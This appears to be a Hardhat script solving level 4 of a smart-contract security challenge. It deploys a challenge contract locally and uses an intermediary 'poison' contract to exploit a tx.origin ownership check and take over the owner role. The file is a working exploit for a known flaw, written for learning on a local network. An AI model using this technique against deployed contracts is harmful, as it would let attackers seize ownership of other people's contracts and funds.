import { ethers } from "hardhat";

/**
 * The vulnerability in level 4 lies in the tx origin check to assign a new owner or not.
 * 
 * By simply creating a new contract that calls the changeOwner() function,
 * we are able to have a different msg.sender and tx.origin and thus
 * are able to change the owner address.
 */
async function main() {
  const accounts = await ethers.getSigners();  
  const lvl4contractFactory = await ethers.getContractFactory("Lvl4");
  console.log("Deploying contract...");
  const lvl4Contract = await lvl4contractFactory.deploy();
  console.log("Awaiting confirmations...");
  await lvl4Contract.deployed();
  console.log(`Contract deployed locally at ${lvl4Contract.address}`);

  const currentOwner = await lvl4Contract.owner();
  console.log(`Current owner: ${currentOwner}`);
  const poisonContractFactory = await ethers.getContractFactory("PoisonLvl4TxOrigin");
  console.log("Deploying Poison contract...");
  const poisonContract = await poisonContractFactory.connect(accounts[1]).deploy(lvl4Contract.address);
  console.log("Awaiting confirmations...");
  await poisonContract.deployed();
  console.log(`Poison contract deployed locally at ${poisonContract.address}`);

  console.log(`Changing owner to ${accounts[1].address}...`);
  const changeOwnerTx = await poisonContract.connect(accounts[1]).changeOwner(accounts[1].address);
  await changeOwnerTx.wait();
  const newOwner = await lvl4Contract.owner();
  console.log(`New owner address: ${newOwner}`);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
